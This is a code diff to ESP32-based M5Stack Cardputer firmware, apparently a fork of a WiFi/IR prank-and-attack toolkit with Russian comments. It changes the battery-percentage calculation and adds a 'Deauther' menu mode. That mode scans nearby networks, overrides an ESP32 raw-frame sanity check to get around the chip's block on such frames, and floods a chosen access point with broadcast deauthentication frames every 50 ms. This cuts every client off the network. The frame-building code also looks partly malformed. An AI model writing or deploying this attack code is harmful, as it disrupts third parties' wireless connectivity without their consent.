@@ -172,9 +172,10 @@ uint16_t FGCOLOR=0xFFF1;
   #define M5LED_OFF HIGH
 #endif
 
-// Proc codes (новые 34, 35):
+// Proc codes (новые 34, 35, 36):
 // 34 - SD Card File Browser (CARDPUTER only)
 // 35 - IR Jammer
+// 36 - Deauther (Active Attack)
 // 97 - Mount/UnMount SD Card
 
 const String contributors[] PROGMEM = {
@@ -221,6 +222,7 @@ int dh_pkts = 0;
 #include <IRremote.h>
 #include <DNSServer.h>
 #include <WebServer.h>
+#include <esp_wifi.h>
 #include "applejuice.h"
 #include "WORLD_IR_CODES.h"
 #include "wifispam.h"
@@ -660,15 +662,36 @@ void battery_drawmenu(int battery, float voltage_b = 0, float voltage_c = 0) {
 #if defined(CARDPUTER)
   uint8_t oldBattery = 0;
 
-  // Честный расчет заряда по вольтажу (3300mV = 0%, 4200mV = 100%)
+  struct BattPoint { uint16_t mv; int8_t pct; };
+  const BattPoint liPoCurve[] = {
+    {4200, 100}, {4150, 95}, {4110, 90}, {4080, 85}, {4020, 80},
+    {3980, 75},  {3950, 70}, {3910, 65}, {3870, 60}, {3850, 55},
+    {3840, 50},  {3820, 45}, {3800, 40}, {3790, 35}, {3770, 30},
+    {3750, 25},  {3730, 20}, {3710, 15}, {3690, 10}, {3610, 5},
+    {3270, 0}
+  };
+  const int liPoCurveSize = sizeof(liPoCurve) / sizeof(liPoCurve[0]);
+
   int get_cardputer_battery_pct() {
-    int mv = M5.Power.getBatteryVoltage(); 
-    if (mv < 3300) mv = 3300;
-    if (mv > 4200) mv = 4200;
-    int pct = (mv - 3300) * 100 / (4200 - 3300);
-    if (pct < 0) pct = 0;
-    if (pct > 100) pct = 100;
-    return pct;
+    uint32_t totalMv = 0;
+    for (int i = 0; i < 10; i++) {
+      totalMv += M5.Power.getBatteryVoltage();
+      delay(2);
+    }
+    int mv = totalMv / 10;
+
+    if (mv <= liPoCurve[liPoCurveSize - 1].mv) return 0;
+    if (mv >= liPoCurve[0].mv) return 100;
+
+    for (int i = 0; i < liPoCurveSize - 1; i++) {
+      if (mv <= liPoCurve[i].mv && mv > liPoCurve[i+1].mv) {
+        int mvDiff = liPoCurve[i].mv - liPoCurve[i+1].mv;
+        int pctDiff = liPoCurve[i].pct - liPoCurve[i+1].pct;
+        int mvOffset = liPoCurve[i].mv - mv;
+        return liPoCurve[i].pct - ((mvOffset * pctDiff) / mvDiff);
+      }
+    }
+    return 0;
   }
 
   void battery_setup() {
@@ -680,7 +703,7 @@ void battery_drawmenu(int battery, float voltage_b = 0, float voltage_c = 0) {
   
   void battery_loop() {
     int32_t batteryValues = 0;
-    for(uint8_t i = 0; i < 30; i++) {
+    for(uint8_t i = 0; i < 15; i++) {
       delay(100);
       batteryValues += get_cardputer_battery_pct();
       
@@ -690,7 +713,7 @@ void battery_drawmenu(int battery, float voltage_b = 0, float voltage_c = 0) {
       }
     }
     if(!isSwitching) {
-      uint8_t battery = batteryValues / 30;
+      uint8_t battery = batteryValues / 15;
       if(battery != oldBattery) { oldBattery = battery; battery_drawmenu(battery); }
     }
   }
@@ -1047,7 +1070,9 @@ void btmaelstrom_loop(){
 
 MENU wsmenu[] = {
   { TXT_BACK, 5},{ TXT_WF_SCAN, 0},{ TXT_WF_SPAM_FUN, 1},{ TXT_WF_SPAM_RR, 2},
-  { TXT_WF_SPAM_RND, 3},{ "NEMO Portal", 4},{ "Deauth Hunter", 24},{ TXT_PINEAP_HUNTER, 26},
+  { TXT_WF_SPAM_RND, 3},{ "NEMO Portal", 4},{ "Deauth Hunter", 24},
+  { "Deauther", 36}, // [NEW] Active Attack
+  { TXT_PINEAP_HUNTER, 26},
 };
 int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);
 
@@ -1067,6 +1092,7 @@ void wsmenu_loop() {
       case 5: current_proc = 1; break;
       case 24: current_proc = 24; break;
       case 26: current_proc = 26; break;
+      case 36: current_proc = 36; break; // [NEW] Deauther
     }
   }
 }
@@ -1488,6 +1514,176 @@ void irjam_loop() {
     }
 }
 
+// ============================================================
+// DEAUTHER (Активная атака)
+// ============================================================
+#define DEAUTH_FRAME_LEN 26
+
+// Структура для хранения списка сетей
+struct ScannedNet {
+  String ssid;
+  uint8_t bssid[6];
+  int channel;
+  int rssi;
+};
+
+ScannedNet deauthNets[30];
+int deauthNetCount = 0;
+int deauthCursor = 0;
+bool deauthActive = false;
+uint8_t deauthFrame[DEAUTH_FRAME_LEN];
+
+// Функция отправки raw-фрейма (обход блокировки ESP32)
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  return 0;
+}
+
+void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
+  // Заполняем deauth-фрейм
+  memcpy(deauthFrame, ap_record->bssid, 6);       // Destination (BSSID)
+  memcpy(deauthFrame + 6, target, 6);             // Source (target MAC)
+  memcpy(deauthFrame + 12, ap_record->bssid, 6);  // BSSID
+  deauthFrame[0] = 0xC0; // Deauth
+  deauthFrame[1] = 0x00;
+  deauthFrame[2] = 0x3A; // Duration
+  deauthFrame[3] = 0x01;
+  deauthFrame[4] = target[0]; // Fragment
+  deauthFrame[5] = target[1];
+  deauthFrame[22] = 0x07; // Reason Code (Class 3 frame received)
+  deauthFrame[23] = 0x00;
+
+  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, DEAUTH_FRAME_LEN, false);
+}
+
+void deauth_drawmenu() {
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(SMALL_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
+  DISP.println(" Select Target ");
+  DISP.setTextColor(FGCOLOR, BGCOLOR);
+
+  if (deauthNetCount == 0) {
+    DISP.println("No networks found");
+  } else {
+    int start = 0;
+    if (deauthCursor > 5) start = deauthCursor - 5;
+    for (int i = start; i < deauthNetCount; i++) {
+      if (deauthCursor == i) DISP.setTextColor(BGCOLOR, FGCOLOR);
+      String ssid = deauthNets[i].ssid;
+      if (ssid.length() > 18) ssid = ssid.substring(0, 18);
+      DISP.printf(" %-18s\n", ssid.c_str());
+      DISP.setTextColor(FGCOLOR, BGCOLOR);
+    }
+  }
+  DISP.println("");
+  DISP.println("ENT:Attack TAB:Back");
+}
+
+void deauth_setup() {
+  deauthActive = false;
+  deauthCursor = 0;
+  deauthNetCount = 0;
+
+  DISP.fillScreen(BGCOLOR);
+  DISP.setTextSize(MEDIUM_TEXT);
+  DISP.setCursor(0, 0);
+  DISP.println("Scanning WiFi...");
+
+  // Сканируем сети
+  int n = WiFi.scanNetworks();
+  if (n > 0) {
+    for (int i = 0; i < n && deauthNetCount < 30; i++) {
+      deauthNets[deauthNetCount].ssid = WiFi.SSID(i);
+      deauthNets[deauthNetCount].channel = WiFi.channel(i);
+      deauthNets[deauthNetCount].rssi = WiFi.RSSI(i);
+      memcpy(deauthNets[deauthNetCount].bssid, WiFi.BSSID(i), 6);
+      deauthNetCount++;
+    }
+  }
+  WiFi.scanDelete();
+
+  rstOverride = true;
+  deauth_drawmenu();
+  delay(500);
+}
+
+void deauth_loop() {
+  // Навигация по списку
+  if (check_next_press()) {
+    if (deauthNetCount > 0) {
+      deauthCursor = (deauthCursor + 1) % deauthNetCount;
+      deauth_drawmenu();
+    }
+    delay(250);
+  }
+
+  // Выход
+  if (check_select_press() && !deauthActive) { // Если не атакуем, то Enter = Attack
+    if (deauthNetCount == 0) return;
+
+    // Запускаем атаку на выбранную сеть
+    deauthActive = true;
+    DISP.fillScreen(BGCOLOR);
+    DISP.setTextSize(MEDIUM_TEXT);
+    DISP.setCursor(0, 0);
+    DISP.println("Attacking...");
+    DISP.setTextSize(SMALL_TEXT);
+    DISP.printf("Target: %s\n", deauthNets[deauthCursor].ssid.c_str());
+    DISP.println("Press ANY key to stop");
+
+    // Настраиваем WiFi для отправки
+    WiFi.disconnect();
+    delay(100);
+    WiFi.mode(WIFI_AP);
+    delay(100);
+
+    // Создаем структуру AP для отправки
+    wifi_ap_record_t ap_record;
+    memcpy(ap_record.bssid, deauthNets[deauthCursor].bssid, 6);
+    ap_record.primary = deauthNets[deauthCursor].channel;
+
+    // Целевой MAC (broadcast для отключения всех)
+    uint8_t target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+    uint32_t lastSend = 0;
+    while (deauthActive) {
+      // Отправляем deauth-фреймы каждые 50 мс
+      if (millis() - lastSend > 50) {
+        wsl_bypasser_send_raw_frame(&ap_record, ap_record.primary, target);
+        lastSend = millis();
+      }
+
+      // Проверка на остановку (любая кнопка)
+      M5Cardputer.update();
+      if (M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
+        deauthActive = false;
+        break;
+      }
+      delay(10);
+    }
+
+    // Возвращаемся в меню
+    WiFi.mode(WIFI_STA);
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = 12; // Возврат в WiFi меню
+    delay(300);
+    return;
+  }
+
+  // Если атака активна, но нажали Select - останавливаем
+  if (check_select_press() && deauthActive) {
+    deauthActive = false;
+    WiFi.mode(WIFI_STA);
+    deauth_drawmenu();
+    delay(300);
+  }
+}
+
+// ============================================================
+// PROCESS TABLE & LOOP
+// ============================================================
 struct ProcessHandler {
   int id;
   void (*setup_func)();
@@ -1541,6 +1737,7 @@ ProcessHandler processes[] = {
   {34, sdmenu_setup, sdmenu_loop, "SD Card Browser"},
 #endif
   {35, irjam_setup, irjam_loop, "IR Jammer"},
+  {36, deauth_setup, deauth_loop, "Deauther"}, // [NEW]
 #if defined(SDCARD) && !defined(CARDPUTER)
   {97, nullptr, ToggleSDCard, "SD Card"},
 #endif
